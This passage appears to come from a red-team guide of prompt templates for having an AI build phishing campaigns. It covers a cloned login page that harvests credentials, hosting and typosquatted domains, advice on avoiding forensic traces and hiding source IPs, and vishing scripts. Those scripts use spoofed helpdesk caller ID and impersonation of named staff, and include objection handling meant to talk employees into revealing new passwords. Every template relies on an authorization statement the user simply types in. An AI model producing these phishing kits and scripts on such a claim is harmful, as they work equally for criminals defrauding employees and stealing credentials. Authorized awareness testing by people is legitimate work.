- Verify email authentication (SPF/DKIM pass)
- Test with different email providers

**Believability Testing:**
- Have team members review (fresh eyes)
- Compare side-by-side with legitimate organizational emails
- Check for any obvious giveaways
- Verify timing/context makes sense

---

### Handling Responses

**Plan for:**
- **Employees reporting the email:** Monitor how many report vs. click
- **Employees replying with questions:** Have response strategy ready
- **Employees calling to verify:** Coordinate with client on handling
- **Unexpected spread:** Email forwarded beyond target list
- **Complaints or confusion:** Communication plan with client

---

### Next Steps

After email deployment:

**Monitor Campaign:**
- Track open rates, click rates, credential submissions
- Watch for reports to IT/Security
- Monitor reply-to inbox for questions
- Observe any organizational communication about the campaign

**Analyze Results:**
- Which personas were most susceptible?
- What subject lines performed best?
- What time of day had highest engagement?
- Did any variations outperform others?

**Prepare Reporting:**
- Document what was sent, when, to whom
- Capture metrics and outcomes
- Prepare recommendations based on findings
- Plan debrief/education for affected employees

---

## Section 3: Credential Harvesting Landing Page Creation

### When to Use This Section

Use this prompt when you need to create a realistic landing page that targets will visit after clicking phishing email links. This page will capture credentials or other information as part of your authorized assessment.

### Why This Is Separate

Landing page development requires different skills than email composition: web design, user experience considerations, technical implementation, and backend credential handling. This section focuses on creating functional, believable harvesting infrastructure.

### Required Intelligence

**From Section 2 (Email Campaign):**
- Email pretext and call-to-action
- Target expectations (what they think they're doing)
- URL that was provided in email

**From OSINT Synthesis:**
- Target organization's login page appearance
- Branding guidelines (colors, logos, fonts)
- Authentication workflows (username only, username+password, MFA)
- Third-party authentication services (Auth0, Okta, Azure AD)

**Technical Infrastructure:**
- Hosting environment for landing page
- Domain and SSL certificate
- Backend for credential capture and storage
- Traffic analytics and monitoring

---

### Infrastructure Considerations

Before using this prompt, understand your technical requirements:

**Domain Selection:**
- Typosquatting: Similar to target domain (tech-corp.com vs techcorp.com)
- Subdomains: Legitimate-sounding subdomain (mfa-verify.target-security.com)
- Generic: Plausible but not target-specific (employee-verification.com)
- Registration: WHOIS privacy, registration timing, avoid newly registered red flags

**Hosting Options:**
- Cloud providers: AWS, Azure, GCP (avoid free tiers that flag as suspicious)
- VPS providers: DigitalOcean, Linode, Vultr
- Specialized phishing frameworks: Gophish, Evilginx2, Modlishka
- CDN usage: Cloudflare (provides legitimacy, DDoS protection)

**SSL Certificates:**
- Let's Encrypt: Free, automated, widely trusted
- Commercial CAs: More expensive but slightly more legitimate appearance
- Wildcard certificates: If hosting multiple subdomains

**CAPTCHA Handling:**
- CAPTCHA on landing page may reduce submissions but increase legitimacy
- Consider CAPTCHA-less design if target organization doesn't typically use them
- If target uses CAPTCHA, implement similar solution (reCAPTCHA, hCaptcha)

**Backend Credential Handling:**
- Secure storage: Encrypted database, not plaintext logs
- Real-time notifications: Alert when credentials captured
- Automatic shutdown: Time-limited or count-limited operation
- Data retention: Plan for secure deletion after engagement

**For detailed infrastructure setup guidance, create a follow-up prompt:**

```markdown
I need detailed guidance on setting up infrastructure for my phishing landing page.

My requirements:
- Target domain: [target domain you're mimicking]
- Hosting preference: [cloud provider, VPS, framework]
- Backend language: [PHP, Python, Node.js, etc.]
- Credential storage: [Database type or file-based]
- Monitoring needs: [Real-time alerts, analytics]

Provide:
1. Domain registration best practices for my scenario
2. SSL certificate setup steps
3. Backend code for credential capture and secure storage
4. Logging and monitoring implementation
5. Operational security considerations (hiding source IP, etc.)
6. Testing procedures before deployment
```

---

### Starter Prompt: Landing Page Development

```markdown
I am conducting an authorized phishing assessment and need to create a credential harvesting landing page that targets will encounter after clicking email links. The page must appear legitimate, function smoothly, and securely capture credentials.

ENGAGEMENT AUTHORIZATION:
Client: [YOUR_CLIENT_NAME]
🏢 Enterprise: "TechCorp Industries - Phishing Assessment Contract #SE-2024-091"
🌐 Consumer: "Authorized credential harvesting engagement"

Authorization Scope: [SPECIFIC LANDING PAGE PERMISSIONS]
🏢 Enterprise: "Credential harvesting authorized (username + password). NO malware delivery. NO exploitation beyond credential capture. Campaign operational Dec 10-17, 2024."
🌐 Consumer: "Credential collection authorized for [specific purpose], [date range]"

Landing Page Purpose: [WHAT THIS PAGE DOES]
🏢 Enterprise: "Capture employee usernames and passwords under pretext of MFA enrollment verification"

PRETEXT AND EMAIL CONTEXT:

Email Pretext Summary: [FROM SECTION 2]
🏢 Enterprise: "Email states mandatory MFA enrollment verification required by Dec 15th. Employees directed to click link to verify enrollment status to avoid account lockout."

What Targets Expect: [WHAT THEY THINK THEY'RE DOING]
🏢 Enterprise: "Targets expect to:
1. Land on IT Security verification page
2. Enter their existing credentials to authenticate
3. See confirmation of MFA enrollment status
4. Receive confirmation message and be done"

URL Provided in Email: [EXACT URL FROM PHISHING EMAIL]
🏢 Enterprise: "https://mfa-verify.techcorp-security.com/verify"

LEGITIMATE TARGET ORGANIZATION LOGIN PAGE:

Actual Login Page URL: [THE REAL PAGE YOU'RE MIMICKING]
🏢 Enterprise: "https://login.techcorp.com"

Authentication Method:
🏢 Enterprise: "Auth0-powered login
- Fields: Email address, Password
- Button: 'Sign In'
- Option: 'Forgot Password?' link
- Option: 'Remember Me' checkbox
- Post-auth: Redirects to dashboard"

🌐 Consumer:
- Authentication provider: [Okta/Auth0/Azure/Custom]
- Fields required: [username, email, password, other]
- Authentication flow: [steps user goes through]
- Post-auth behavior: [where they land after login]

Visual Design:
🏢 Enterprise:
- Primary color: #2563EB (blue)
- Secondary color: #F3F4F6 (light gray background)
- Logo: Company logo top-left (240x60px)
- Font: Inter, sans-serif
- Layout: Centered card on gray background, white card with shadow
- Button style: Solid blue, white text, rounded corners

🌐 Consumer:
- Colors: [primary, secondary, accent]
- Logo: [placement, size]
- Typography: [font families]
- Layout: [page structure]
- Component style: [buttons, inputs, cards]

Page Elements:
🏢 Enterprise:
- Header: Company logo
- Title: "Sign in to TechCorp"
- Subtitle: "Enter your email and password"
- Input field 1: Email (with icon)
- Input field 2: Password (with show/hide toggle)
- Checkbox: "Remember me"
- Link: "Forgot password?" (blue, right-aligned)
- Button: "Sign In" (full width, blue)
- Footer: "Privacy Policy | Terms of Service" (centered, small text)
- No CAPTCHA on legitimate page

🌐 Consumer:
- [List all visible elements and their properties]

Error Messages:
🏢 Enterprise:
- Invalid credentials: "Invalid email or password. Please try again."
- Empty fields: "Please enter your email and password."
- Network error: "Unable to connect. Please check your connection."

🌐 Consumer:
- [Error messages and styling from legitimate page]

CLONING REQUIREMENTS:

Cloning Scope: [WHAT SHOULD BE CLONED]
🏢 Enterprise: "Full visual clone of login page only. Do NOT clone:
- Entire website navigation
- Dashboard or internal pages
- JavaScript functionality beyond form submission
- External resource dependencies that might leak indicators"

Modifications Needed: [HOW IT DIFFERS FROM LEGITIMATE PAGE]
🏢 Enterprise:
- Page title: Change to 'MFA Enrollment Verification'
- Additional text: Add banner at top: 'Security Update: Verify MFA Enrollment Status'
- Form submission: Capture credentials, show success message, do NOT actually authenticate
- Success message: 'Enrollment verified successfully. You may close this window.'
- Backend: Log credentials securely, send notification to assessment team

🌐 Consumer:
- Title/heading changes: [modifications]
- Additional elements: [what to add]
- Form behavior: [how submission should work]
- Success flow: [what user sees after submission]

MY TECHNICAL INFRASTRUCTURE:

Hosting Details:
🏢 Enterprise:
- Hosting: AWS EC2 (Ubuntu 22.04)
- Web server: Nginx
- Backend language: Python (Flask)
- SSL: Let's Encrypt certificate
- Domain: techcorp-security.com

🌐 Consumer:
- Hosting: [platform/server]
- Web server: [Apache/Nginx/IIS]
- Backend: [language/framework]
- SSL: [certificate type]
- Domain: [your domain]

Credential Capture Requirements:
🏢 Enterprise:
- Captured data: Email, password, timestamp, IP address (for tracking, not attribution)
- Storage: SQLite database, encrypted at rest
- Notification: Email to assessment team upon each capture
- Retention: 30 days, then secure deletion per contract
- Access: Restricted to assessment team only

🌐 Consumer:
- Data to capture: [fields]
- Storage method: [database/file/API]
- Notification: [how team is alerted]
- Retention: [time period]
- Access control: [who can see captured data]

Traffic Considerations:
🏢 Enterprise:
- Expected volume: 450 potential visitors over 7 days
- Geographic source: United States (company has no international employees)
- User agents: Mostly desktop browsers (Chrome, Edge), some mobile
- Access pattern: Expect spike within hours of email send
- Logging: Log all access attempts (success and failure)

🌐 Consumer:
- Expected volume: [number of potential visitors]
- Geographic source: [expected locations]
- User agents: [expected devices/browsers]
- Timing: [when traffic expected]
- Logging needs: [what to track]

TASK FOR AI:

Based on all context provided, generate the following:

1. **COMPLETE HTML PAGE CODE**
   - Full HTML structure matching the legitimate page design
   - Inline CSS or linked stylesheet (your choice)
   - Form with appropriate input fields
   - Client-side validation (basic, to feel legitimate)
   - Responsive design (works on mobile and desktop)
   - All visual elements matching target page

2. **BACKEND CREDENTIAL CAPTURE CODE**
   - Form submission handler
   - Credential storage (secure, encrypted)
   - Timestamp and metadata logging
   - Notification trigger upon capture
   - Error handling for edge cases

3. **SUCCESS PAGE / MESSAGE**
   - What user sees after submitting credentials
   - Appears legitimate and concludes the interaction
   - Provides closure (e.g., "You may close this window")

4. **CONFIGURATION REQUIREMENTS**
   - Server configuration notes (Nginx/Apache)
   - Database setup (if applicable)
   - SSL certificate installation steps
   - Environment variables or config files needed

5. **TESTING CHECKLIST**
   - What to test before deployment
   - Expected behavior vs. actual behavior
   - Cross-browser compatibility notes
   - Mobile responsiveness verification

6. **OPERATIONAL SECURITY NOTES**
   - How to avoid leaving forensic traces
   - Log file management
   - Secure data handling reminders
   - Shutdown procedures after engagement

**CRITICAL CONSTRAINTS:**

You must:
✅ Create a visually accurate clone of the legitimate page
✅ Implement secure credential capture and storage
✅ Ensure the page functions smoothly for targets
✅ Include proper error handling and edge cases
✅ Provide complete, working code (not pseudocode)
✅ Consider user experience (smooth, no obvious bugs)

You must NOT:
❌ Include actual authentication against target systems
❌ Create malware delivery mechanisms
❌ Implement credential stuffing or attack automation
❌ Store credentials insecurely (plaintext)
❌ Create backdoors or persistence mechanisms
❌ Include tracking that compromises target privacy beyond engagement scope

Generate production-ready code that I can deploy after testing, with clear documentation for setup and operation.
```

---

### Using This Prompt

**Workflow:**

1. **Research legitimate login page thoroughly** (screenshots, HTML source, styling)
2. **Set up hosting infrastructure** (domain, server, SSL)
3. **Fill in prompt template** with comprehensive details
4. **Generate landing page code** via AI
5. **Download all generated code** to local development environment
6. **Test extensively** before deployment (see testing checklist below)
7. **Deploy to production** only after thorough validation
8. **Monitor during campaign** (traffic, captures, errors)

**Iteration Guidance:**

**If visual accuracy isn't close enough:**
```markdown
The generated page doesn't accurately match the legitimate page. Specific differences:

1. [Difference 1]: e.g., "Button color is wrong - should be #2563EB not #3B82F6"
2. [Difference 2]: e.g., "Logo placement is centered, should be left-aligned"
3. [Difference 3]: e.g., "Missing 'Remember me' checkbox"

I'm attaching a screenshot of the real page: [describe in detail or provide markup]

Regenerate the HTML/CSS to exactly match these visual specifications:
- [Specific element]: [Exact styling]
- [Specific element]: [Exact styling]
```

**If backend code needs different language/framework:**
```markdown
You provided backend code in [LANGUAGE] but I need it in [DIFFERENT LANGUAGE/FRAMEWORK].

Requirements:
- Framework: [Specific framework - Express, Django, Laravel, etc.]
- Database: [PostgreSQL, MySQL, MongoDB, SQLite]
- Deployment environment: [Environment details]

Convert the credential capture logic to [TARGET LANGUAGE/FRAMEWORK] while maintaining:
- Same security practices (encryption, secure storage)
- Same notification mechanism
- Same logging functionality
```

**If you need additional security features:**
```markdown
I need to add security features to the landing page:

1. [Feature 1]: e.g., "Rate limiting - max 3 submission attempts per IP in 5 minutes"
2. [Feature 2]: e.g., "Geofencing - only accept traffic from US IP addresses"
3. [Feature 3]: e.g., "Automatic shutdown - disable after 100 credential captures"

Provide updated backend code implementing these security measures while maintaining core functionality.
```

**If mobile responsiveness needs improvement:**
```markdown
The page doesn't display correctly on mobile devices. Issues:
- [Issue 1]: e.g., "Form is too wide, extends beyond viewport"
- [Issue 2]: e.g., "Logo is too large on small screens"
- [Issue 3]: e.g., "Button text too small to tap easily"

Provide updated CSS with media queries to ensure proper responsive design for:
- Mobile portrait (320px - 480px)
- Mobile landscape (481px - 768px)
- Tablet (769px - 1024px)
- Desktop (1025px+)
```

**If you need A/B testing variations:**
```markdown
I want to test different landing page variations to see what converts better:

Variation A (Current): [Description]
Variation B: [Changes - e.g., "Add trust badges, security icons"]
Variation C: [Changes - e.g., "Simplify form, fewer fields"]

Generate HTML for variations B and C while keeping backend credential capture identical.
```

---

### Verification Checklist

Before deploying landing page:

**Visual Accuracy:**
- [ ] Matches legitimate page colors exactly
- [ ] Logo is correct size and placement
- [ ] Font families match or are close substitutes
- [ ] Button styling matches target page
- [ ] Input field styling and icons match
- [ ] Footer links and text match
- [ ] Page title and favicon are appropriate
- [ ] No obvious visual discrepancies

**Functional Testing:**
- [ ] Form submission works correctly
- [ ] Credentials are captured and stored
- [ ] Success message displays properly
- [ ] Error handling works for edge cases
- [ ] "Forgot password" link behavior is appropriate
- [ ] "Remember me" checkbox (if present) behaves expectedly
- [ ] Back button and page refresh don't break anything

**Security Testing:**
- [ ] Credentials stored securely (encrypted, not plaintext)
- [ ] Database/storage has proper access controls
- [ ] Sensitive data not exposed in logs
- [ ] No SQL injection vulnerabilities
- [ ] No XSS vulnerabilities
- [ ] Rate limiting prevents abuse (if implemented)
- [ ] Notification system working

**Technical Validation:**
- [ ] SSL certificate valid and trusted
- [ ] HTTPS enforced (no mixed content warnings)
- [ ] Page loads quickly (< 2 seconds)
- [ ] No console errors in browser developer tools
- [ ] All external resources load correctly
- [ ] Tracking/analytics working (if applicable)
- [ ] DNS resolves correctly

**Cross-Platform Testing:**
- [ ] Desktop Chrome rendering correctly
- [ ] Desktop Edge rendering correctly
- [ ] Desktop Firefox rendering correctly
- [ ] Mobile Safari (iOS) rendering correctly
- [ ] Mobile Chrome (Android) rendering correctly
- [ ] Tablet viewing acceptable

**Operational Readiness:**
- [ ] Team knows how to access captured credentials
- [ ] Notification alerts are working
- [ ] Monitoring is in place for traffic and errors
- [ ] Backup plan exists if page goes down
- [ ] Documentation for troubleshooting common issues
- [ ] Shutdown procedure is documented

**Authorization Alignment:**
- [ ] Page captures only authorized data (username/password)
- [ ] No malware or exploit code present
- [ ] Operation timeline aligns with engagement dates
- [ ] Data retention plan follows contract terms
- [ ] Client notification requirements met

---

### Common Mistakes to Avoid

❌ **Obvious visual differences from legitimate page**
- Wrong colors, wrong fonts, poor quality logo
- Layout doesn't match expected design
- Mobile view is broken or doesn't exist

❌ **Technical red flags**
- Self-signed or invalid SSL certificate
- Suspicious domain name (obvious typosquatting)
- Slow page load times
- Console errors visible in developer tools
- Mixed content warnings (HTTP resources on HTTPS page)

❌ **Insecure credential storage**
- Storing passwords in plaintext
- Writing credentials to world-readable log files
- Emailing credentials without encryption
- No access controls on credential database

❌ **Poor user experience**
- Form submission is slow or hangs
- No feedback on successful submission
- Error messages that reveal it's fake
- Broken "Forgot password" link (should handle gracefully)

❌ **Inadequate testing**
- Only testing on one browser
- Not testing mobile devices
- Not testing form validation
- Not testing error cases (empty fields, etc.)

❌ **Operational failures**
- Page goes down during campaign
- Notification system not working (team doesn't know credentials captured)
- Database fills up and stops accepting entries
- No monitoring to detect issues

❌ **Forensic evidence**
- Page source contains comments revealing it's a phishing page
- Metadata or headers reveal assessment infrastructure
- Logs containing assessment team information
- Backup files left on server (.bak, .old, .swp)

---

### Testing Before Deployment

**Internal Testing Protocol:**

1. **Local Testing:**
   - Set up page on local development environment
   - Test all functionality without DNS/SSL
   - Fix any bugs or issues

2. **Staging Server Testing:**
   - Deploy to staging server (not production domain yet)
   - Test with proper SSL certificate
   - Verify credential capture and storage
   - Test notification system
   - Run security scans (Burp Suite, OWASP ZAP)

3. **Visual Comparison:**
   - Open legitimate page and cloned page side-by-side
   - Screenshot both for detailed comparison
   - Check every element for visual accuracy
   - Test on multiple devices and browsers

4. **Usability Testing:**
   - Have team members try to use the page
   - Observe for confusion or obvious issues
   - Verify user flow feels natural and expected
   - Test error messages and edge cases

5. **Load Testing:**
   - If expecting high volume, test server capacity
   - Simulate multiple simultaneous submissions
   - Verify page remains responsive under load

6. **Security Validation:**
   - Run automated security scanner
   - Test for common web vulnerabilities
   - Verify no sensitive data exposed
   - Check for information leakage

---

### Monitoring During Campaign

**Active Monitoring:**
- Real-time dashboard showing traffic and captures
- Alerts when credentials captured
- Uptime monitoring (is page responding?)
- Error rate monitoring (500 errors, crashes)
- Geographic traffic analysis (unexpected locations?)

**Logging to Capture:**
- Timestamp of each visit and submission
- IP address (for tracking, not attribution)
- User agent (browser/device information)
- Referer header (how they arrived)
- Success/failure of credential submission
- Any error messages generated

**Response Procedures:**
- Page goes down: Immediate notification and recovery plan
- Unexpected traffic spike: Verify it's legitimate campaign traffic
- Reports to IT: Coordinate with client on handling
- Technical issues: Quick troubleshooting and fixes without revealing assessment

---

### Post-Campaign Actions

**Secure Data Handling:**
- Download captured credentials to secure location
- Encrypt credentials for storage
- Remove credentials from production server
- Secure deletion of server logs
- Verify no residual data remains

**Infrastructure Teardown:**
- Take down landing page after campaign ends
- Release domain or point to takedown notice
- Remove DNS records
- Delete server instances (or at least data)
- Document infrastructure for reporting

**Results Analysis:**
- Total visits vs. credential submissions
- Conversion rate (clicked link → entered credentials)
- Time from email send to credential capture
- Geographic and temporal patterns
- Comparison to legitimate authentication patterns

---

### Next Steps

After landing page deployment:

**Campaign Execution:**
- Monitor traffic from phishing emails
- Track credential captures in real-time
- Watch for reports or questions from targets
- Be ready to respond to technical issues

**Results Documentation:**
- Capture screenshots of page in operation
- Document all captured credentials (encrypted)
- Log any unusual events or responses
- Prepare metrics for final report

**Client Reporting:**
- Which employees submitted credentials
- Time-to-compromise metrics
- Success rate by department or role
- Comparison to previous assessments
- Recommendations based on findings

---

## Section 4: Vishing Script Development

### When to Use This Section

Use this prompt when you need to create phone-based social engineering scripts (vishing) as part of your authorized assessment. This generates actual call scripts with conversation flows, handling objections, and technical talking points.

### Why This Is Separate

Vishing requires different skills than email phishing: real-time improvisation, voice acting, handling unexpected responses, and technical phone infrastructure. This section focuses on creating conversation frameworks that work in dynamic phone interactions.

### Required Intelligence

**From Section 1 (Pretext Development):**
- Selected pretext for phone scenario
- Target personas and roles
- Psychological triggers
- Authorization boundaries

**From OSINT Synthesis:**
- How organization's helpdesk/IT typically operates
- Common technical support issues employees face
- Phone number format (internal extensions, external numbers)
- Names and titles of legitimate IT staff

**Additional Vishing Requirements:**
- Calling infrastructure (VoIP, phone numbers, caller ID spoofing)
- Team member(s) conducting calls (voice, confidence, technical knowledge)
- Call recording setup (for documentation and legal compliance)
- Expected call volume and duration

---

### Infrastructure Considerations for Vishing

Before using this prompt, understand your technical requirements:

**Calling Infrastructure Options:**
- **VoIP Services:** Twilio, Vonage, Google Voice (varies by legitimacy)
- **Spoofing Capabilities:** Caller ID spoofing where legally permitted
- **Call Recording:** Mandatory in many jurisdictions (check local laws)
- **Phone Numbers:** Local area codes matching target organization

**Legal Considerations:**
- **Consent Laws:** Two-party vs. one-party consent for recording
- **Impersonation Laws:** What constitutes illegal impersonation
- **Telecom Regulations:** Caller ID spoofing restrictions
- **Authorization Documentation:** Explicit phone-based SE authorization

**Operational Setup:**
- **Quiet Environment:** Background noise management
- **Script Access:** Easy reference during calls without obvious reading
- **Note-Taking:** Efficient documentation during conversation
- **Multiple Callers:** Consistent pretext execution across team members

**For detailed vishing infrastructure guidance, create a follow-up prompt:**

```markdown
I need guidance on setting up technical infrastructure for vishing operations.

My requirements:
- Target organization location: [country/region]
- Expected call volume: [number of calls over engagement period]
- Caller ID requirements: [spoofing needs vs. generic number]
- Recording requirements: [legal jurisdiction and consent laws]
- Budget: [constraints if any]

Provide:
1. VoIP service recommendations for my scenario
2. Legal considerations for call recording in [jurisdiction]
3. Caller ID configuration best practices
4. Call quality and reliability considerations
5. OPSEC concerns (avoiding traces back to assessment team)
6. Testing procedures before live calls
```

---

### Starter Prompt: Vishing Script Creation

```markdown
I am conducting an authorized vishing (voice phishing) assessment and need to create a comprehensive call script with conversation flows, objection handling, and technical talking points. The script must sound natural, handle unexpected responses, and achieve assessment objectives while staying within authorization boundaries.

ENGAGEMENT AUTHORIZATION:
Client: [YOUR_CLIENT_NAME]
🏢 Enterprise: "TechCorp Industries - Vishing Assessment Contract #SE-2024-091"
🌐 Consumer: "Authorized vishing engagement"

Authorization Scope: [SPECIFIC VISHING PERMISSIONS]
🏢 Enterprise: "Phone-based social engineering authorized for IT helpdesk staff and general employees. NO calls to C-suite or legal department. NO impersonation of law enforcement. Credential collection authorized via phone support pretext. Campaign dates: Dec 10-17, 2024."
🌐 Consumer: "Vishing authorized for [target roles], [date range], [specific prohibitions]"

Vishing Objective: [WHAT YOU'RE TRYING TO ACCOMPLISH]
Examples:
- "Test helpdesk password reset procedures without proper authentication"
- "Gather sensitive information under IT support pretext"
- "Convince employee to install remote access tool"
- "Verify MFA token delivery via phone social engineering"

PRETEXT CONTEXT:

Selected Pretext: [NAME OF PRETEXT]
🏢 Enterprise: "Urgent IT Security Password Reset Request"

Pretext Summary: [DETAILED DESCRIPTION]
🏢 Enterprise: "Caller poses as legitimate employee calling IT helpdesk claiming they're locked out of their account due to forgotten password. After helpdesk resets password, caller then calls back posing as helpdesk asking employee to verify new temporary password for 'security audit.' Goal: Obtain employee credentials through helpdesk interaction and follow-up call."

Target Persona: [WHO IS BEING CALLED]
🏢 Enterprise:
- Primary Target: IT Helpdesk Staff (receiving calls from fake employees)
- Secondary Target: General Employees (receiving follow-up calls from fake helpdesk)

Caller Identity: [WHO YOU'RE PRETENDING TO BE]
🏢 Enterprise:
- Scenario 1 Caller: Employee "Sarah Mitchell" from Marketing department
- Scenario 2 Caller: IT helpdesk staff "Mike from IT Support"

Psychological Triggers: [WHAT MOTIVATES COMPLIANCE]
🏢 Enterprise: "Urgency (locked out, can't work), Authority (IT department calling), Helpfulness (employee wants to cooperate with IT), Routine nature (password resets are common)"

ORGANIZATIONAL INTELLIGENCE:

Helpdesk Operations:
🏢 Enterprise:
- Helpdesk phone number: (555) 123-4567
- Hours of operation: Monday-Friday, 8 AM - 6 PM EST
- Ticketing system: Jira Service Desk
- Common process: Caller gives name and employee ID, helpdesk verifies identity with security questions, password reset sent via email
- Typical verification: Last four of SSN, manager name, department

🌐 Consumer:
- Helpdesk contact: [number or process]
- Operating hours: [when available]
- Ticketing: [system used if known]
- Process: [typical workflow]
- Verification: [what they typically ask]

Common Technical Issues:
🏢 Enterprise:
- VPN connection problems (frequent complaint)
- Password expiration (30-day rotation policy)
- MFA token sync issues
- Email access problems
- Application access issues

🌐 Consumer:
- [Frequently reported issues based on OSINT]

IT Staff Names and Roles:
🏢 Enterprise:
- Mike Chen: IT Security Director
- Tom Rodriguez: Helpdesk Lead
- Jessica Park: System Administrator
- Generic references: "The helpdesk team", "IT Support", "Security team"

🌐 Consumer:
- [Known IT staff from OSINT]
- [Generic titles that work]

Technical Environment Details:
🏢 Enterprise:
- Authentication: Auth0 with MFA (60% adoption)
- VPN: Cisco AnyConnect
- Email: Microsoft 365
- Operating systems: Primarily Windows 10, some Macs
- Common applications: Slack, Jira, Salesforce

🌐 Consumer:
- [Technology details from OSINT Phase 2]

Communication Style:
🏢 Enterprise:
- IT helpdesk: Professional but friendly, patient with non-technical users
- Typical greeting: "IT helpdesk, this is [Name], how can I help you?"
- Common phrases: "I'll need to verify your identity first", "Let me pull up your account", "I can reset that for you"
- Tone: Helpful, not condescending, calm even when users are frustrated

🌐 Consumer:
- [Observed communication style]
- [Typical greetings and phrases]

VISHING SCENARIO FLOW:

Call Scenario 1: Employee Calling Helpdesk
🏢 Enterprise:
1. Caller (posing as employee) calls helpdesk: (555) 123-4567
2. Claims to be locked out of account, password not working
3. Provides employee details to pass verification
4. Requests password reset
5. Goal: Test what verification helpdesk actually performs before resetting password

Call Scenario 2: Helpdesk Calling Employee
🏢 Enterprise:
1. Caller (posing as helpdesk) calls employee after scenario 1 completed
2. Claims to be following up on password reset for "security audit"
3. Asks employee to confirm new temporary password "for verification purposes"
4. Goal: Obtain employee's new password by impersonating helpdesk

🌐 Consumer:
- [Your scenario flow]
- [Step-by-step progression]
- [Decision points and branches]

TECHNICAL CALLING DETAILS:

My Calling Infrastructure:
🏢 Enterprise:
- VoIP service: Twilio
- Caller ID: Will display (555) 123-4567 (spoofed helpdesk number) or (555) 999-8888 (generic company number)
- Call recording: Enabled (legal in our jurisdiction with one-party consent)
- Background noise: Office environment audio track for believability

🌐 Consumer:
- Service: [VoIP provider]
- Caller ID: [what will display]
- Recording: [yes/no and legal basis]
- Environment: [setting]

Expected Call Characteristics:
🏢 Enterprise:
- Call duration: 3-8 minutes typical for helpdesk calls
- Urgency level: Moderate (employee needs access but not life-threatening)
- Technical detail: Non-technical users require patient explanation
- Common questions: "How long will reset take?", "Will this affect my email?"

🌐 Consumer:
- Duration: [expected length]
- Urgency: [appropriate level]
- Technical: [target's expected knowledge]
- Questions: [likely responses]

TASK FOR AI:

Based on all context provided, create comprehensive vishing scripts that include:

1. **CALL SCRIPT - SCENARIO 1 (Employee to Helpdesk)**

   **Opening:**
   - Initial greeting and introduction
   - Establishing urgency without panic
   - Stating the issue clearly

   **Identity Verification Phase:**
   - Responding to helpdesk verification questions
   - Information to provide (employee ID, details)
   - Handling insufficient information scenario

   **Problem Description:**
   - Explaining the lockout/password issue
   - Technical details to mention
   - Maintaining consistent story

   **Request Phase:**
   - Asking for password reset
   - Handling helpdesk questions
   - Accepting their process

   **Closing:**
   - Confirming next steps
   - Thanking for assistance
   - Natural exit from call

   **Objection Handling:**
   - If helpdesk requires more verification
   - If helpdesk refers to different process
   - If helpdesk seems suspicious

2. **CALL SCRIPT - SCENARIO 2 (Helpdesk to Employee)**

   **Opening:**
   - Professional greeting as helpdesk
   - Reference to recent password reset
   - Stating purpose of call

   **Credential Request:**
   - Framing request as "verification"
   - Making it seem routine/procedural
   - Handling initial hesitation

   **Overcoming Objections:**
   - Addressing concerns about sharing password
   - Using authority and procedure as reasoning
   - Offering alternatives if target pushes back

   **Information Gathering:**
   - Primary goal: New password
   - Secondary: Other account details
   - Tertiary: Understanding their security awareness

   **Closing:**
   - Confirming "verification complete"
   - Professional thank you and exit
   - Handling post-call questions

   **Objection Handling:**
   - If employee refuses to share password
   - If employee wants to call back
   - If employee asks questions that reveal suspicion

3. **PSYCHOLOGICAL TECHNIQUES**
   - Authority establishment
   - Building rapport quickly
   - Urgency without aggression
   - Mirroring target's communication style
   - Confidence and competence projection

4. **TECHNICAL TALKING POINTS**
   - Accurate technical terminology for this organization
   - Explanations for non-technical targets
   - Responses to common technical questions
   - Troubleshooting conversation (if needed)

5. **CONVERSATION BRANCHES**
   - If target asks unexpected questions
   - If conversation goes off-script
   - If target becomes suspicious
   - If target is very compliant (get more information)
   - If target refuses (graceful exit)

6. **DOCUMENTATION TEMPLATE**
   - What to note during/after each call
   - Success/failure criteria
   - Information gathered
   - Target's security awareness level

7. **RED FLAGS AND ABORT CONDITIONS**
   - When to end call immediately
   - Suspicious responses that indicate awareness
   - Questions that reveal you're being tested
   - When target says they're recording or involves others

8. **POST-CALL PROCEDURES**
   - Documenting the interaction
   - Next steps based on outcome
   - Coordination with team
   - Follow-up timing if applicable

**CRITICAL CONSTRAINTS:**

You must:
✅ Create natural-sounding conversation flows
✅ Include realistic technical details for this organization
✅ Provide objection handling for likely scenarios
✅ Build in abort conditions for ethical boundaries
✅ Consider various target sophistication levels
✅ Maintain consistent pretext throughout call

You must NOT:
❌ Create scripts that threaten or frighten targets excessively
❌ Include tactics that cross legal boundaries for impersonation
❌ Suggest collecting information beyond authorization scope
❌ Create scripts that could cause genuine business harm
❌ Include manipulations that exploit severe personal vulnerabilities
❌ Suggest recording without legal basis

Generate conversation scripts that are thorough, adaptable, and professional, suitable for trained social engineers to use in authorized assessments.
```

---

### Using This Prompt

**Workflow:**

1. **Complete pretext development** (Section 1) before scripting calls
2. **Research helpdesk procedures** and common IT interactions
3. **Set up calling infrastructure** (VoIP, recording, caller ID)
4. **Fill in prompt template** with comprehensive organizational details
5. **Generate vishing scripts** via AI
6. **Practice scripts** internally before live calls (role-play)
7. **Document procedures** for call execution and note-taking
8. **Execute calls** with real-time adaptation based on target responses

**Iteration Guidance:**

**If scripts sound too scripted (not natural):**
```markdown
The scripts you generated sound too formal/robotic. I need them to sound like natural conversation.

Rewrite the scripts with:
- More casual language: [specific examples of how people actually talk]
- Natural filler words: "um", "you know", "so", (used sparingly)
- Incomplete sentences: "Yeah, if you could just...", "So what I need is..."
- Realistic pauses and acknowledgments: "Okay", "Got it", "Right"

The goal is scripts that sound like someone talking, not reading.
```

**If technical details need adjustment:**
```markdown
The technical terminology in the script doesn't match how this organization actually talks.

Update the script to use:
- Their terminology: Instead of [AI's term], say [org's actual term]
- Their process: Their actual password reset process is [describe]
- Their tools: They use [specific tools], not [generic terms]

Regenerate incorporating their specific technical language and processes.
```

**If objection handling is insufficient:**
```markdown
I need more robust objection handling for these scenarios:

Objection 1: Target says "I don't give passwords over the phone"
- Currently your script says: [current response]
- This isn't convincing enough. Provide 3 different approaches to overcome this.

Objection 2: Target says "Let me call you back on the official helpdesk number"
- Need strategy for: [how to respond without breaking cover]

Objection 3: Target asks technical question I can't answer
- Provide graceful ways to deflect or redirect without appearing suspicious

Generate enhanced objection handling for these specific scenarios.
```

**If you need scripts for different caller personas:**
```markdown
I need variations of this vishing script for different callers on my team:

Caller A: Male, technical background, confident
Caller B: Female, less technical, friendly/helpful tone  
Caller C: Older voice, more authoritative, impatient

Adapt the same core script for these three personas, adjusting:
- Language complexity
- Tone and demeanor
- Technical detail level
- Urgency presentation

Maintain the same pretext but customize delivery for each persona.
```

**If you need multi-call campaign scripts:**
```markdown
This vishing campaign involves multiple calls:

Call 1: [Initial contact with purpose]
Call 2 (24 hours later): [Follow-up escalation]
